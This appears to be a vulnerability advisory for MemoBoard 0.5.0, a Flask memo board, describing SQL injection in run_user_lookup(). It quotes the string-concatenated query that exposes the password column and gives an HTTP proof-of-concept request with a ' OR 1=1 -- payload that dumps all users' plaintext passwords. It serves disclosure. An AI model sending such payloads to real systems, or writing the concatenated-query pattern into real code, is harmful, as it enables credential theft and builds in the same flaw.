descriptions.description: CWE-89 Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

descriptions.value:
MemoBoard (pip package memoboard) version 0.5.0 is a Flask intranet memo board.
It is affected by SQL injection (CWE-89) because src/board/engine.py run_user_lookup() concatenates the caller-supplied name into a SELECT that also projects the password column, skipping the intended parameterized query.
Attack chain: an unauthenticated GET to /api/users (source: query parameter name in src/app.py api_users) reaches the sink conn.execute(sql) in run_user_lookup without sanitization on the default deployment.
Vulnerable code in src/board/engine.py:
def run_user_lookup(name: str) -> list[dict]:
    # String-concatenated SQL. `name` is a query parameter.
    sql = f"SELECT id, name, role, email, password FROM users WHERE name = '{name}'"
    with _connect() as conn:
        rows = conn.execute(sql).fetchall()
    return [dict(r) for r in rows]
HTTP PoC:
GET /api/users?name=' OR 1=1 -- HTTP/1.1
Host: TARGET:5000
Accept: application/json
Connection: close
Impact: a remote unauthenticated attacker can dump all users' plaintext passwords, including the administrator account. Remaining control: none on the default install; this demonstration is read-only disclosure via a single SQLite statement.
